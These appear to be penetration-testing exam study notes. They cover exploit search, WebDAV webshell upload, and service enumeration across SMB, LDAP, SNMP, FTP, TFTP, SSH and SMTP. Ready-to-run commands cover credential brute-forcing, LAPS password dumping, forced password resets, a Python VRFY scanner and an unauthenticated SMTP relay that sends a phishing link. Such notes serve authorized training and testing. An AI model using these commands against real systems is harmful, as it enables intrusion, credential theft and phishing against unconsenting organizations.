Vulnerability Scanning & Public Exploit Search

When to use: After identifying service + exact version, before exploitation. Nessus/OpenVAS are BANNED — use searchsploit + manual research instead.

searchsploit vsftpd                          # search by product name
searchsploit -u                              # update exploitdb package
searchsploit -m 49757                        # mirror/copy exploit locally
searchsploit -c OpenSSH                      # case-sensitive
searchsploit -t vsftpd                       # search title only
searchsploit -t "Buffer Overflow"            # search by vuln type
searchsploit remote windows smb
searchsploit local windows                   # privesc exploits
searchsploit local windows smb -w            # -w = show online source link
searchsploit -x 45161                        # examine (view) an exploit
searchsploit -p 45161                        # show local path to an exploit
searchsploit --id vsftpd                     # show EDB-ID column in results
searchsploit --exclude="dos|PoC" vsftpd      # drop noisy DoS/PoC entries
searchsploit --nmap scan.xml                 # cross-reference every service in Nmap XML with EDB

Cross-reference an Nmap XML output with the local Exploit-DB: run sudo nmap -sV -oX scan.xml <IP> first, then searchsploit --nmap scan.xml prints matched CVEs per port. Fastest way to triage a wide scan.

NSE exploit-tagged scripts inventory:

# List every NSE script tagged as an actual exploit
grep -l 'categories.*exploit' /usr/share/nmap/scripts/*.nse

# Run a specific one
sudo nmap --script clamav-exec  -p 3310 <IP>
sudo nmap --script smb-vuln-ms17-010 -p 445 <IP>
sudo nmap --script "smb-vuln-*"       -p 445 <IP>
sudo nmap --script http-shellshock --script-args uri=/cgi-bin/status,cmd=id -p 80 <IP>

Vetting exploit code before you run it — the cautionary tale:

Public exploits sometimes bury destructive commands in obfuscated arrays. Classic red flags: an SSH exploit that asks for local root on the attacker, or a "shellcode" byte array that decodes to a destructive shell command. Decode any embedded byte array as ASCII first:

python3 -c 'print(bytes.fromhex("<hex-bytes-no-spaces>").decode())'
# If it decodes to something like a recursive delete, do NOT run the exploit.

Always decode every embedded byte array in an unfamiliar exploit before running.

Cross-compiling exploit code:

sudo apt-get install mingw-w64 gcc

# Windows target from Linux
i686-w64-mingw32-gcc exploit.c -o exploit.exe
i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32     # if it needs Winsock

# Linux target
gcc -pthread exploit.c -o exploit -lcrypt

Legitimate exploit sources: Exploit-DB, Rapid7 (Metasploit module DB), GitHub (vsftpd 2.3 site:github.com), Packet Storm. Always read exploit code before running it — verify it does what it claims (no coin-miner/backdoor payloads baked in) and patch local IP/port placeholders.

CVSS Scoring & Vulnerability Prioritization

When to use: Reference for triaging findings under exam time pressure. Tells you what to chase first.

CVSS v3.1 severity bands:

CVSS Base Score Rating Exam priority
9.0 – 10.0 Critical RCE / auth bypass — try immediately
7.0 – 8.9 High Missing patches, stored XSS, insecure crypto
4.0 – 6.9 Medium Config weaknesses, reflected XSS, weak auth
0.1 – 3.9 Low/Info Banner/SSL info, dir listing, verbose errors

Exploitation-first prioritization (what to try, in order):

  1. Critical — RCE, auth bypass, privesc, high-impact SQLi -> immediate exploitation attempt
  2. High — info disclosure, stored XSS, missing security patches -> secondary targets
  3. Medium/Low — config weaknesses, reflected XSS, banner disclosure -> post-exploitation/persistence opportunities, or chain into something bigger

Credentialed vs unauthenticated scanning: A credentialed scan (valid SSH/SMB/DB creds) sees local patch level, config, and privilege misconfigs an unauthenticated network scan cannot. When you already hold creds, re-checking a host with them surfaces far more than the external view.

WebDAV Enumeration & Abuse

When to use: IIS or Apache on 80/443 responds to OPTIONS with WebDAV methods (PROPFIND, MKCOL, PUT), or http-enum NSE flags /webdav/.

# Detect WebDAV methods
nmap -sV -sC <IP>
nmap -sV -p80 --script=http-enum <IP>
curl -X OPTIONS -i http://<IP>/webdav/       # look for Allow: PUT, MKCOL, PROPFIND

# Brute-force WebDAV creds
hydra -L <USERLIST> -P <PASSLIST> <IP> http-get /webdav/

# davtest — probes what file types can be uploaded and executed
davtest -auth <USER>:<PASS> -url http://<IP>/webdav
#   -auth USER:PASS    HTTP Basic Auth
#   -url URL           target WebDAV endpoint
# Reports which extensions upload successfully AND execute (e.g. .php works but .asp doesn't)

# cadaver — interactive WebDAV client
cadaver http://<IP>/webdav
dav:/webdav/> put shell.asp
dav:/webdav/> ls
dav:/webdav/> delete shell.asp

WebDAV = HTTP extension letting the web server double as a collaborative file server. Requires legitimate creds to write — brute-force is the usual path in. Once authenticated with cadaver, upload a webshell matching the server (.asp/.aspx for IIS, .php for Apache) and browse to it.

DNS (Port 53)

Zone Transfer

Attempt to transfer entire zone file. Often misconfigured in internal networks.

# Zone transfer attempt
dig axfr @<DNS_IP> <DOMAIN>

# Zone transfer with specific internal domain
dig axfr @<DNS_IP> internal.<DOMAIN>

Subdomain Enumeration

Discover all subdomains within target domain.

# dnsenum
dnsenum --dnsserver <DNS_IP> --enum -p 0 -s 0 -o subdomains.txt -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt <DOMAIN>

# Gobuster DNS
gobuster dns -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r <DNS_IP> -i -t 100 -o gobuster.txt

# Bash loop subdomain brute-force
for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt); do
  dig $sub.<DOMAIN> @<DNS_IP> | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt
done

# Query nameservers
dig ns <DOMAIN> @<DNS_IP>

# Specific record types
nslookup -type=any <DOMAIN> <DNS_IP>

SMB/CIFS (Ports 139, 445)

Null Session Enumeration

No authentication required. Critical in older/misconfigured networks.

# smbclient null session
smbclient -N -L //<IP>

# rpcclient null session
rpcclient -U "" -N <IP>

# Enum4linux null session
enum4linux -a <IP>
enum4linux-ng <IP> -A

RID cycling fallback progression (PG Vault / Resourced) — when the anon null session is denied, escalate through guest then SAMR:

nxc smb <DC_IP> -u '' -p '' --rid-brute          # STATUS_ACCESS_DENIED?
nxc smb <DC_IP> -u 'guest' -p '' --rid-brute     # guest (enabled, blank pw) often works
# If both RID cycling (LSAD) and anon LDAP are locked down, SAMR still enumerates users
# (enum4linux-ng also dumps the description field — admins leave passwords there):
enum4linux-ng -A <DC_IP>

Authenticated SMB Enumeration

# smbclient authenticated
smbclient -U '<user>%<pass>' //<IP>/<SHARE>

# SMBMap enumeration
smbmap -u <user> -p <pass> -d <DOMAIN> -H <IP>
smbmap -u <user> -p <pass> -H <IP> -R <SHARE> --dir-only

# Nmap SMB scan
sudo nmap <IP> -sV -sC -p139,445

# Windows LOLBAS — list shares WITHOUT dropping smbclient
net view \\<HOSTNAME> /all

Useful SMB NSE scripts (extend --script smb-vuln*):

  • smb-vuln-ms17-010 — EternalBlue detection (Windows 7/2008)
  • smb-vuln-ms08-067 — legacy but still lives on ancient boxes
  • smb-vuln-cve-2017-7494 — SambaCry (Linux Samba RCE)
  • smb-vuln-webexec — Cisco WebEx RCE via SMB share
  • smb-double-pulsar-backdoor — detects the DOUBLEPULSAR implant left by ETERNALBLUE

RPC Client (rpcclient)

Interactive RPC enumeration. Powerful with null session or credentials.

# Interactive mode
rpcclient -U "" -N <IP>

# Inside rpcclient:
rpcclient $> srvinfo              # Server info
rpcclient $> enumdomains          # Domain names
rpcclient $> querydominfo         # Domain info
rpcclient $> enumdomusers         # User list
rpcclient $> enumdomgroups        # Group list
rpcclient $> querygroupmem <RID>  # Group members
rpcclient $> queryuser <RID>      # User details
rpcclient $> netshareenumall      # Share enumeration
rpcclient $> netsharegetinfo <share>

# RID brute-force (common range: 500-1100)
for i in $(seq 500 1100); do
  rpcclient -N -U "" <IP> -c "queryuser 0x$(printf '%x\n' $i)" | grep -E "User Name|user_rid|group_rid" && echo ""
done

# Impacket samrdump (SAM enumeration)
samrdump.py <IP>

# Reset another user's password over RPC when your account holds the ACE
# (User-Force-Change-Password / GenericAll edge — post-cred AD privesc, PG-exam pattern)
rpcclient -U '<USER>%<PASS>' <IP> -c "setuserinfo2 <TARGET_USER> 23 'NewPass123!'"

# Inside: who

# Nmap vulnerability scanning

# Samba config review (if shell access)

Dangerous smb.conf settings: browseable = yes (share discovery), read only = no / writable = yes (write access), guest ok = yes (no auth), enable privileges = yes (SID-based privs), create mask = 0777 / directory mask = 0777 (world-writable), logon script / magic script (auto-executed scripts for persistence).

LDAP (Ports 389, 636)

Anonymous Bind

Query LDAP without credentials. Often possible in AD.

# Base query
ldapsearch -x -H ldap://<IP> -s base namingcontexts

# Enumerate users anonymous
ldapsearch -x -H ldap://<IP> -b "DC=DOMAIN,DC=LOCAL" "(objectClass=user)" sAMAccountName

# Full enumeration
ldapsearch -x -h <IP> -b "DC=<DOMAIN>,DC=<TLD>" -s sub "(&(objectclass=user))" | grep sAMAccountName

# Do this FIRST on any DC — dump everything and grep the free-text fields where admins leave secrets
# (PG Hutch/Resourced — cleartext passwords sat in the description field)
ldapsearch -x -H ldap://<IP> -b "DC=<DOMAIN>,DC=<TLD>" \
  | grep -i 'description\|info\|userPassword\|pwd\|pass'

# LAPS local-admin password via raw attribute read (fallback when nxc -M laps is unavailable, PG Hutch)
ldapsearch -x -H ldap://<IP> -D '<USER>@<DOMAIN>' -w '<PASS>' \
  -b "DC=<DOMAIN>,DC=<TLD>" ms-Mcs-AdmPwd msLAPS-Password
#   ms-Mcs-AdmPwd = legacy LAPS   |   msLAPS-Password = Windows LAPS

Authenticated LDAP

# Bind with credentials
ldapsearch -x -H ldap://<IP> -D "user@domain" -w '<pass>' -b "DC=DOMAIN,DC=LOCAL"

# Enumerate password policy
ldapsearch -h <IP> -x -b "DC=<DOMAIN>,DC=<TLD>" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

SNMP (UDP 161)

Simple Network Management Protocol. Monitors/configures network devices. MIB = vendor-neutral schema; OID = numeric path in the MIB tree.

Version Security Notes
SNMPv1 None (no auth, no encryption) Legacy; plaintext everything
SNMPv2c Community string (plaintext) Bulk transfers, better errors
SNMPv3 Auth (user/pass) + encryption USM; use in modern environments 
# snmpwalk with public community
snmpwalk -v2c -c public <IP>

# snmpwalk with specific OID
snmpwalk -v2c -c public <IP> 1.3.6.1.4.1

# OneSixtyOne community string brute-force
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt <IP>

# Braa (mass OID query)
braa public@<IP>:.1.3.6.*

# Nmap SNMP scan
sudo nmap <IP> -sU -p 161 --script snmp*

# Config review (if shell access)
cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r '/^\s*$/d'

# Net-SNMP "extend"/"exec" scripts — frequently leak command output, paths, or creds on Linux
snmpwalk -v2c -c public <IP> NET-SNMP-EXTEND-MIB::nsExtendObjects

Dangerous settings: rwuser noauth (full tree read/write without auth), rwcommunity <string> <source> (full tree access from any source), rwcommunity6 (same for IPv6).

FTP (Port 21)

Anonymous FTP

# Connect with anonymous login (Name: anonymous / Password: blank or email)
ftp <IP>

# FTP commands: ls -R, get <file>, put <file>, mput <files>

# Mirror entire FTP server with wget
wget -m ftp://anonymous:@<IP>
wget -m --no-passive "ftp://anonymous:anonymous@<TARGET_IP>"

# FTP debug/diagnostic commands
ftp> debug            # toggle debug mode
ftp> trace            # toggle packet tracing
ftp> status           # show client status
ftp> get <file> -     # download to stdout (read without saving)

# Nmap FTP enumeration
sudo nmap -sV -p21 -sC -A <IP>
nmap --script ftp-anon -p 21 <IP>

# Banner grab
telnet <IP> 21

# FTPS certificate inspection
openssl s_client -connect <IP>:21 -starttls ftp

vsFTPd dangerous settings: anonymous_enable=YES, anon_upload_enable=YES, anon_mkdir_write_enable=YES, no_anon_password=YES, write_enable=YES. Blocked accounts list: /etc/ftpusers.

FTP Anonymous File Retrieval

When anonymous FTP is available, recursively download everything and search for credentials or sensitive files.

# Recursive download of entire FTP tree
wget -r --no-passive-ftp ftp://anonymous:anonymous@<TARGET_IP>/

# Or using lftp for better recursive handling
lftp -u anonymous,anonymous <TARGET_IP>
lftp> mirror --parallel=5 / ./ftp_dump/

# Search downloaded content for credentials
grep -ri "password\|passwd\|credential\|secret" ./ftp_dump/ 2>/dev/null
find ./ftp_dump/ -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name "*.bak" 2>/dev/null

# Umbraco .sdf database credential extraction (if downloaded from FTP/SMB)
strings Umbraco.sdf | grep -i "admin\|password\|user"
# Credentials stored as SHA1 hashes — crack with hashcat -m 100

TFTP (UDP 69)

UDP-based file transfer. No authentication, no directory listing — must know/guess filenames. Common targets: PXE stores, router/switch backups, VoIP, ICS/OT. Typical root: /var/lib/tftpboot.

# Nmap TFTP scan
sudo nmap -sU -p69 <TARGET>

# Enumerate TFTP files with wordlist
sudo nmap -sU -p69 --script tftp-enum --script-args "tftp-enum.filelist=/path/to/list.txt" <TARGET>

Interactive client (tftp-hpa):

tftp <TARGET>
tftp> verbose
tftp> status
tftp> mode binary            # use binary/octet for non-text files
tftp> get pxelinux.0
tftp> put upload.bin
tftp> quit

Non-interactive with atftp:

# GET (download)
atftp -g -r pxelinux.0 -l ./pxelinux.0 <TARGET>

# PUT (upload)
atftp -p -r upload.bin -l ./upload.bin <TARGET>

# Tweak reliability
atftp --option "timeout 5" --option "blksize 1428" -g -r file <TARGET>

BusyBox one-liner (minimal shells):

busybox tftp -g -r pxelinux.0 <TARGET>

Windows client (enable TFTP Client in Windows Features):

tftp -i <TARGET> GET pxelinux.0 pxelinux.0
tftp -i <TARGET> PUT C:\temp\upload.bin upload.bin

PXE filename enumeration list:

pxelinux.0
pxelinux.cfg/default
undionly.kpxe
grub.cfg
EFI/BOOT/bootx64.efi
startup-config
running-config

Server-side check (if you have shell):

ps aux | grep -E 'tftpd|in.tftpd|atftpd|tftpd-hpa'

Pentest notes: Reads often open for loot (configs, creds in initrds). Writes sometimes allowed for PXE poisoning. Always use binary/octet for non-text.

SSH (Port 22)

# SSH audit (security assessment)
ssh-audit <IP>

# Force password authentication (no key auth)
ssh -v <user>@<IP> -o PreferredAuthentications=password

# Login
ssh <user>@<IP>
ssh -i key_file <user>@<IP>

# Fix "Too many authentication failures" (server MaxAuthTries) — offer ONLY the given key
ssh -o IdentitiesOnly=yes -i key <user>@<IP>
ssh -F /dev/null -o IdentitiesOnly=yes -i key <user>@<IP>   # also ignore ~/.ssh/config

# Connect to a LEGACY sshd that rejects modern algorithms (old boxes, e.g. PG ZenPhoto)
ssh -oHostKeyAlgorithms=+ssh-rsa \
    -oKexAlgorithms=+diffie-hellman-group1-sha1 \
    -oPubkeyAcceptedAlgorithms=+ssh-rsa <user>@<IP>

# Config review (if shell access)
cat /etc/ssh/sshd_config | grep -v "#" | sed -r '/^\s*$/d'

Dangerous sshd_config settings: PermitRootLogin yes, PasswordAuthentication yes, PermitEmptyPasswords yes, Protocol 1, AllowTcpForwarding yes, PermitTunnel, DebianBanner yes, X11Forwarding yes.

SMTP (Ports 25, 465, 587)

User Enumeration

# smtp-user-enum
smtp-user-enum -M VRFY -U users.txt -t <IP>

# Nmap SMTP scripts
nmap --script smtp-open-relay -p 25 <IP>

# Manual enumeration via telnet
telnet <IP> 25
VRFY <username>
EXPN <group>
QUIT

VRFY response codes (know what the server means):

Code Meaning
250 User confirmed valid
252 Server WILL accept mail but won't confirm the recipient exists (common — still reveals valid syntax)
550 User does not exist (or VRFY disabled)

Manual VRFY scan from Kali via Python — when smtp-user-enum isn't installed on a jump box:

#!/usr/bin/env python3
# vrfy.py — usage: python3 vrfy.py <IP> users.txt
import socket, sys
ip, wl = sys.argv[1], sys.argv[2]
for u in open(wl):
    u = u.strip()
    s = socket.socket(); s.connect((ip, 25)); s.recv(1024)
    s.send(f"VRFY {u}\r\n".encode())
    r = s.recv(1024).decode().strip()
    if r.startswith(("250","252")):
        print(f"[+] {u}  {r}")
    s.close()

NFS User Discovery from Folder Names

After mounting an NFS share, folder names under home-directory exports often reveal valid usernames. UID/GID mismatches may block reads — create a local user matching the target UID to bypass this.

sudo -u tempuser ls -la /mnt/nfs/<USER>/

# Unmount when done
sudo umount /mnt/nfs

Key insight: NFS exports often lack Kerberos or proper UID mapping, meaning file ownership is purely numeric UID. Create a local user with the same UID as the file owner to read restricted files.

SSL/TLS Certificate Mining — Host/Domain Discovery

SSL certificates contain Subject, Issuer, and Subject Alternative Names (SANs) that often leak internal hostnames, domain names, CA server names, and internal IP addresses. ALWAYS inspect SSL certificates on HTTPS services.

# Extract certificate details
openssl s_client -connect <IP>:443 2>/dev/null | openssl x509 -noout -text | grep -A1 "Subject\|Issuer\|Subject Alternative"

# Save certificate to file
openssl s_client -connect <IP>:443 -showcerts 2>/dev/null | openssl x509 -outform PEM -out cert.pem

# Extract Subject CN / SANs / Issuer
openssl x509 -in cert.pem -noout -subject
openssl x509 -in cert.pem -noout -text | grep -A1 "Subject Alternative"
openssl x509 -in cert.pem -noout -issuer

Key information to extract:

  • Subject CN: Internal FQDN (e.g., mail., intranet.)
  • Subject Alternative Names (SAN): Internal hostnames and IPs — these are virtual hosts waiting to be added to /etc/hosts
  • Issuer CN: CA server name (e.g., <DOMAIN>-CA01-CA reveals CA server location and domain)

SAN enumeration workflow for vhost discovery:

# Quick one-liner to extract all DNS SANs from an HTTPS service
openssl s_client -connect <TARGET_IP>:443 2>/dev/null \
  | openssl x509 -noout -text \
  | grep -oP 'DNS:\K[^,\s]+' | sort -u

# Add all SANs to /etc/hosts for further enumeration
echo "<TARGET_IP> <SAN1> <SAN2> <SAN3>" | sudo tee -a /etc/hosts

Add all discovered hostnames to /etc/hosts for Kerberos authentication later.

Windows NFS Export Enum (HTB Remote)

Windows Server exports over NFS turn into a foothold when the mounted share hides a CMS DB or backup:

showmount -e <IP>                                # list exports
sudo mkdir /mnt/nfs
sudo mount -t nfs <IP>:/site_backups /mnt/nfs
# Then hunt for .sdf, .db, .bak, wp-config.php etc.

# Zone transfer reveals internal vhosts

# Note any preprod-*/dev-* CNAMEs, then vhost fuzz them

SMTP Relay Bypass (External-From Address — HTB Outdated)

When to use: hMailServer and some Postfix configs only require auth when the FROM header is inside the local domain. External-from addresses relay unauthenticated -> phishing vector.

swaks --to itsupport@<DOMAIN> --from "attacker@evil.htb" --server <IP> \
      --header "Subject: Internal web app" \
      --body "http://<LHOST>/msdt.html"
#   --to        recipient
#   --from      envelope sender (external-from = bypasses auth)
#   --server    SMTP relay to use

PG Practice — SMTP User Enumeration (PostFish)

VRFY confirms which users exist; RCPT with a real domain confirms the address format:

smtp-user-enum -M VRFY -U users.txt -t <IP>
smtp-user-enum -M RCPT -D postfish.off -U users.txt -t <IP>
#   -M    enumeration method (VRFY, EXPN, RCPT)
#   -U    username wordlist
#   -D    domain to append (RCPT mode only)
#   -t    target IP

Manual raw SMTP:

nc <IP> 25
HELO x
VRFY bob            # 252 = "cannot verify but will accept", 250 = confirmed, 550 = no
RCPT TO:<bob@postfish.off>
